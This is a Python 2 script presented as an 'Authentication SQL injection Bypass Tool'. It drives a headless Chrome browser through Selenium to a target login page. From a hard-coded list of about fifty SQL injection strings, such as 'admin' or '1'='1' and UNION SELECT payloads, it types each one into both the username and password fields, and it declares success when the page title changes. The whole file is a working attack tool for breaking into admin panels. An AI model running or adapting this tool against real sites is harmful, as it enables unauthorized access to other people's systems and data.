from pyvirtualdisplay import Display
from selenium import webdriver
import os,sys
from argparse import ArgumentParser

parser=ArgumentParser(
	description="CS Authentication SQL injection Bypass Tool. This tool is developed to bypass authentication on admin panels with the help of sql injection. I recommend to use -v to see better results. ",
	usage="auth.py [--help] url [-username u] [-password p] [-submit s] [-visible v]"
)

parser.add_argument('url',action="store",help='url of the target')
parser.add_argument('-u','--username',action="store",help='Enter Username Field name')
parser.add_argument('-p','--password',action="store",help='Enter Password Field name')
parser.add_argument('-s','--submit',action="store",help='Enter Submit Button Name')
parser.add_argument('-v','--visible',action="store_true",help="If you want to display in browser")
args=parser.parse_args()

def space(j):
	i = 0
	while i<=j:
		print " ",
		i+=1

def credits():
	space(6);print "-----------------------------------------------------"
	space(6);print "| CS Authentication SQL injection Bypass Tool       |"
	space(6);print "| Coded by Aditya Joshi                             |"
	space(6);print "| Version : 1                                       |"
	space(6);print "| CyberSucks.TK                                     |"
	space(6);print "| Twitter @darktruth190                             |"	
	space(6);print "| Facebook: Fb.me/CyberSec007                       |"
	space(6);print "-----------------------------------------------------\n\n"

def main():
	admin = ['or 1=1', 'or 1=1--', 'or 1=1#', 'or 1=1/*', "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", "admin') or '1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", 'admin" --', 'admin" #', 'admin"/*', 'admin" or "1"="1', 'admin" or "1"="1"--', 'admin" or "1"="1"#', 'admin" or "1"="1"/*', 'admin"or 1=1 or ""="', 'admin" or 1=1', 'admin" or 1=1--', 'admin" or 1=1#', 'admin" or 1=1/*', 'admin") or ("1"="1', 'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 'admin") or ("1"="1"/*', 'admin") or "1"="1', 'admin") or "1"="1"--', 'admin") or "1"="1"#', 'admin") or "1"="1"/*', '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055']
	user = args.username
	password = args.password
	submit = args.submit
	url = args.url
	if args.visible:
		display = Display(visible=1, size=(800, 600))
	else:
		display = Display(visible=0, size=(800, 600))
	display.start()
	driver = webdriver.Chrome()
	for lines in admin:
		driver.get(url)
		old_title = driver.title
		u = driver.find_element_by_name(user)
		p = driver.find_element_by_name(password)
		s = driver.find_element_by_name(submit)
		u.send_keys(lines)
		p.send_keys(lines)
		s.click()
		new_title = driver.title
		if old_title != new_title:
			print "Looks like login was successfull using username",lines,"& password",lines
			break
credits()
main()	
